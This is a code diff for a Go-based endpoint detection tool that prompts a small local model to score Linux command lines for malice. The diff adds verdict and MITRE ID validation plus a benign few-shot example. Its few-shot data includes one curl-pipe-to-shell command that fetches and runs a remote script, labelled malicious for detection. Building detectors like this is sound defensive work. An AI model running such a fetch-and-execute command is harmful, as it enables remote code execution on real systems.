@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"regexp"
 	"strings"
 	"time"
 )
@@ -20,9 +21,9 @@ type Scorer interface {
 	Name() string
 }
 
-// systemPrompt frames Phi-3 as a Linux endpoint analyst and pins the output
-// shape. Phi-3 is small, so accuracy is won here — keep it Linux-oriented and
-// expand the tradecraft hints / few-shot pairs over time (Step C).
+// systemPrompt frames the model (llama3.2:1b) as a Linux endpoint analyst and
+// pins the output shape. The model is small, so accuracy is won here — keep it
+// Linux-oriented and expand the tradecraft hints / few-shot pairs over time.
 const systemPrompt = `You are a Linux endpoint security analyst. You are given a single process execution (the command line plus a little context) and must judge how likely it is to be malicious.
 
 Reply with ONLY a single JSON object, no prose, with exactly these keys:
@@ -58,6 +59,30 @@ var fewShot = []struct {
 		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
 		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script downloaded and piped straight into a shell","mitre":["T1059","T1105"],"risk_indicators":["curl|sh"]}`,
 	},
+	{
+		// Benign twin: a desktop/JS process that superficially looks scriptish
+		// but is a normal GNOME extension — must score LOW (curbs false positives).
+		Command: "gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js",
+		JSON:    `{"risk_score":0.02,"verdict":"benign","reason":"GNOME desktop shell extension","mitre":[],"risk_indicators":[]}`,
+	},
+}
+
+// mitreRe matches valid MITRE ATT&CK technique IDs (e.g. T1059, T1059.004).
+var mitreRe = regexp.MustCompile(`^T\d{4}(\.\d{3})?$`)
+
+// validVerdicts is the allowed verdict label set.
+var validVerdicts = map[string]bool{"benign": true, "suspicious": true, "malicious": true}
+
+// keepValidMitre drops hallucinated/malformed technique IDs (e.g. "T102",
+// "R1202") so only well-formed ATT&CK codes reach the output.
+func keepValidMitre(in []string) []string {
+	out := []string{}
+	for _, m := range in {
+		if m = strings.TrimSpace(m); mitreRe.MatchString(m) {
+			out = append(out, m)
+		}
+	}
+	return out
 }
 
 // OllamaClient scores commands via a local Ollama server running a small model.
@@ -83,6 +108,7 @@ type ollamaRequest struct {
 	Model   string         `json:"model"`
 	Prompt  string         `json:"prompt"`
 	Stream  bool           `json:"stream"`
+	Format  string         `json:"format,omitempty"`
 	Options map[string]any `json:"options"`
 }
 
@@ -95,10 +121,12 @@ type ollamaResponse struct {
 // is pinned to 0 for repeatable verdicts.
 func (c *OllamaClient) Score(ctx context.Context, e ExecEvent) (ScoreResult, error) {
 	reqBody, err := json.Marshal(ollamaRequest{
-		Model:   c.Model,
-		Prompt:  buildPrompt(e),
-		Stream:  false,
-		Options: map[string]any{"temperature": 0},
+		Model:  c.Model,
+		Prompt: buildPrompt(e),
+		Stream: false,
+		Format: "json", // force the model to emit a valid JSON object
+		// temperature 0 for repeatable verdicts; num_predict caps runaway output.
+		Options: map[string]any{"temperature": 0, "num_predict": 256},
 	})
 	if err != nil {
 		return ScoreResult{}, err
@@ -190,8 +218,10 @@ func parseResult(text string) (ScoreResult, error) {
 		score = 1
 	}
 
-	verdict := strings.TrimSpace(raw.Verdict)
-	if verdict == "" {
+	// Validate the verdict label against the enum; fall back to the banded
+	// score when the model returns an empty or bogus value (e.g. "high").
+	verdict := strings.ToLower(strings.TrimSpace(raw.Verdict))
+	if !validVerdicts[verdict] {
 		verdict = verdictForScore(score)
 	}
 
@@ -199,7 +229,7 @@ func parseResult(text string) (ScoreResult, error) {
 		RiskScore:      score,
 		Verdict:        verdict,
 		Reason:         strings.TrimSpace(raw.Reason),
-		Mitre:          raw.Mitre,
+		Mitre:          keepValidMitre(raw.Mitre), // drop hallucinated codes
 		RiskIndicators: raw.RiskIndicators,
 	}, nil
 }
